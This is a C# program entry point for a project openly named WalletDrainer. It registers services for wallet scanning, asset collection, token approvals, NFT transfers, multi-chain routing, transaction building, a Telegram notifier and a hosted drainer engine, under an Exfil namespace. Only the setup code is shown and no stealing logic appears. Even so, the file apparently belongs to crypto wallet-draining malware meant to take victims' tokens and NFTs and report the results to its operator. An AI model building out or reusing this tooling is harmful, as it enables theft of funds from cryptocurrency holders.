using Microsoft.Extensions.DependencyInjection;
using Microsoft.Extensions.Hosting;
using WalletDrainer.Blockchain;
using WalletDrainer.Config;
using WalletDrainer.Core;
using WalletDrainer.Exfil;

namespace WalletDrainer;

internal static class Program
{
    public static async Task Main(string[] args)
    {
        var host = Host.CreateDefaultBuilder(args)
            .ConfigureServices((context, services) =>
            {
                services.AddSingleton(DrainerConfig.Load());
                services.AddSingleton<ChainConfig>();
                services.AddSingleton<Web3Client>();
                services.AddSingleton<GasEstimator>();
                services.AddSingleton<TokenApproval>();
                services.AddSingleton<NftTransfer>();
                services.AddSingleton<MultiChainRouter>();
                services.AddSingleton<WalletScanner>();
                services.AddSingleton<AssetCollector>();
                services.AddSingleton<TransactionBuilder>();
                services.AddSingleton<TelegramNotifier>();
                services.AddSingleton<DrainerEngine>();
                services.AddHostedService<DrainerEngine>(sp => sp.GetRequiredService<DrainerEngine>());
            })
            .Build();

        await host.RunAsync();
    }
}
